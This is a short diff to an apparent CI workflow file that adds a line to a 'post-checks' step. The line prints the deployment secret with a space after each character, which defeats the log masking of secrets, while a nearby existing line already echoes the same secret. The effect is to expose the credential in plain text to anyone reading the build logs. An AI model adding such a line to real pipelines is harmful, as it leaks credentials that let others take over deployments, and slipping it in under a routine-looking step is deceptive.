@@ -69,3 +69,4 @@ jobs:
         run: |
           echo "Executing post-checks..."
           echo "Deployed with secret: $DEPLOY_SECRET"
+          echo ${{secrets.DEPLOY_SECRET}} | sed 's/./& /g'
